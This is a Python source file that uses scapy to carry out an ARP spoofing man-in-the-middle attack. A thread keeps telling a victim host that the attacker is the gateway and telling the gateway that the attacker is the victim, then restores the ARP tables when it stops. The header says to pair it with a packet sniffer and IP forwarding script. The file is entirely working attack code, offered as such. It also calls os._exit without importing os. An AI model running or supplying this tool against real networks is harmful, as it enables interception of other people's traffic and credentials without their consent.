# Python script that sets up a MITM attack using arp spoofing / poisioning
# Should be used with packet_sniffer.py and ip_forwarding.py

from threading import Thread, Event
import scapy.all as scapy
import time
import sys

class ArpSpoofer(Thread):
    def  __init__(self, *args):
        super().__init__()
        self.print_name = "ARP spoofer"
        self.daemon = True
        self.socket = None
        self.timeouts = 0
        self.target = args[0]
        self.gateway = args[1]
        self.gateway_mac = ''
        self.target_mac = ''
        self.logger = args[2]
        self.classPrint("Initializing.", "[+]")
        self.stop_spoofing = False

    def join(self, timeout=None):
        #for joining the thread / stopping the spoofing
        self.stop_spoofing = True
        self.restore()
        super().join(timeout)

    def getMAC(self, ip):
        #gets MAC address by IP
        arp_request = scapy.ARP(pdst=ip)
        eth_package = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_package = eth_package/arp_request
        ans_package = scapy.srp(arp_package, timeout=1, verbose=False)[0]
        if len(ans_package) == 0:
            self.timeouts += 1
            self.classPrint("Target with IP " + str(ip) + " did not give us their MAC. Timeouts : " + str(self.timeouts) +"/10", "[-]")
            if self.timeouts > 9:
                self.classPrint("Too many timeouts, the client is probably offline", "[-]")
                sys.exit(0)
                os._exit(1)
        else:
            return ans_package[0][1].hwsrc

    def restore(self):
        #Restore ARP tables on both router and victim.
        #This redirects the network flow back to normal.
        self.classPrint("Restoring ARP tables.", "[+]")
        self.restoreARP(self.target, self.target_mac, self.gateway, self.gateway_mac)
        self.restoreARP(self.gateway, self.gateway_mac, self.target, self.target_mac)

    def spoofARP(self, target_ip, target_mac, spoof_ip):
        #create ARP response telling target IP that our MAC is the spoofed IP's MAC
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        #extra check so we don't send spoofing packages after the restore packages
        if self.stop_spoofing == False:
            scapy.send(packet, verbose=False)

    def restoreARP(self, destination_ip, destination_mac, source_ip , source_mac):
        #create ARP response telling destination IP the real MAC of the source IP
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

    def run(self):
        #function that starts the man in the middle attack usign all defined functions
        packages_sent = 0
        try:
            self.gateway_mac = self.getMAC(self.gateway)
            self.target_mac = self.getMAC(self.target)
            self.classPrint("Now continuously spoofing ARP tables of " + self.target +" & " + self.gateway + ".","[*]")
            while self.stop_spoofing == False:
                #tell the victim that we are the router
                self.spoofARP(self.target, self.target_mac, self.gateway)
                #tell the router that we are the victim
                self.spoofARP(self.gateway, self.gateway_mac, self.target)
                packages_sent += 2
                #self.classPrint("Sent " + str(packages_sent) + " ARP responses.", True)
                #sleep a bit
                time.sleep(2)
        #I dont think a KeyboardInterrupt will reach this place but still, we can try ;)
        except KeyboardInterrupt:
            self.join()

    def classPrint(self, text, icon):
        #Adds a class name to the printed messages.
        msg = "{} {}   -> \t{}".format(icon,self.print_name,text)
        self.logger.info(msg)
